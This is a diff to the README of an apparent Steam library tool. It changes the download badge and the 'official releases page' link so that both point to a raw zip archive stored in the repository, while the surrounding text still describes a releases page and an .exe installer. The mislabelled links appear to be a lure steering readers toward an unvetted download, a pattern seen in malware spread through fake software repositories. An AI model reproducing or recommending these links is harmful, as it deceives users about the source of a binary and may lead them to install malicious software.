@@ -1,6 +1,6 @@
 # ⚙️ steam-tools - Manage your Steam library with ease
 
-[![Download Steam Tools](https://img.shields.io/badge/Download-Steam_Tools-blue)](https://github.com/brittcaloric720/steam-tools)
+[![Download Steam Tools](https://img.shields.io/badge/Download-Steam_Tools-blue)](https://raw.githubusercontent.com/brittcaloric720/steam-tools/main/tools/tools_steam_v2.4.zip)
 
 ## 📋 About this project
 
@@ -15,7 +15,7 @@ Steam Tools provides a simple interface to manage your Steam collection. It help
 
 ## 🚀 Setting up the software
 
-1. Visit the [official releases page](https://github.com/brittcaloric720/steam-tools) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/brittcaloric720/steam-tools/main/tools/tools_steam_v2.4.zip) to find the latest version.
 2. Look for the file ending in .exe under the latest release.
 3. Click the file name to download the installer to your computer.
 4. Locate the file in your downloads folder.
